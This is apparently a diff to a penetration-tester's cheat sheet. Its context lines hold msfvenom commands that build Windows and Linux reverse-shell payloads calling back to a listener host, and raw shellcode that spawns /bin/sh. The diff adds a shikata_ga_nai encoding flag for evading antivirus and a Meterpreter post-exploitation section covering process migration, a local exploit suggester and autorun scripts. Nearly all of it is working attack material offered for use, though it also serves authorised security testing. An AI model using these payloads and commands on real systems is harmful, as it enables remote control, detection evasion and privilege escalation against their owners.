@@ -13,6 +13,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > r
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f exe > reverse.exe
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=777 -f elf >reverse.elf
+-e x86/shikata_ga_nai -i 25
 
 Linux x86 /bin/sh execve
 \x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
@@ -60,4 +61,12 @@ powershell.exe -e
 C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe (32bit)
 C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe (32bit -> 64bit)
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (64bit)
+```
+## Meterpreter
+```
+use post/windows/manage/migrate
+post/windows/manage/archmigrate
+run post/multi/recon/local_exploit_suggester
+set AUTORUNSCRIPT multi_console_command -r /root/autoruncommands.rc
+ps ; migrate
 ```
